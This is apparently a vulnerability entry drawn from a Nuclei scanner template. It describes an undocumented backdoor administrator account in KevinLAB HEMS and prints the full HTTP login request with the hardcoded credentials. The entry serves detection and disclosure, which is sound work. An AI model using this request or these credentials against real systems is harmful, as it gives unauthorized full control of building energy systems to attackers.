# Vulnerability: KevinLAB HEMS - Backdoor Detection
**Classification:** KEVINLAB
**Source:** Nuclei Template (`kevinlab-hems-backdoor.yaml`)

## Description
KevinLAB HEMS has an undocumented backdoor account and these sets of credentials are never exposed to the end-user and cannot be changed through any normal operation of the solution through the RMI. An attacker could exploit this vulnerability by logging in using the backdoor account with highest privileges for administration and gain full system control. The backdoor user cannot be seen in the users settings in the admin panel and it also uses an undocumented privilege level (admin_pk=1) which allows full availability of the features that the HEMS is offering remotely.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /dashboard/proc.php?type=login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept-Encoding: gzip, deflate
Connection: close

userid=kevinlab&userpass=kevin003
```

